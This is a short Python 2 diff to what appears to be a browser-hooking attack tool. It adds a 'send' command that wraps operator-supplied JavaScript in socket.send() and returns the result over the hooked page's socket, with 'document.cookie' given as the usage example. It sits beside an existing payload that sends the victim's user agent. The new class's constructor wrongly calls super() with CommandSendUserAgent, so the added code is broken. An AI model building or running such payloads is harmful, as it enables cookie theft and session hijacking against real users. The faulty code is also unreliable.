@@ -235,4 +235,19 @@ class CommandSendUserAgent(CMD):
     def get_payload(self):
         return """socket.send(navigator.userAgent)"""
     
+class CommandSendThroughSocket(CMD):
+    
+    def __init__(self):
+        super(CommandSendUserAgent, self).__init__(
+              "Send Through Socket",
+              "send",
+              "Sends the output of the Javascript code you write. Prints to stout. (Usage: >send document.cookie)")
+
+    def get_payload(self):
+        if len(self.argv) < 2:
+            print "Must provide code (usage: >send [code])"
+            return ""
+
+        return """socket.send({})""".format(" ".join(self.argv[1:]))
+    
         
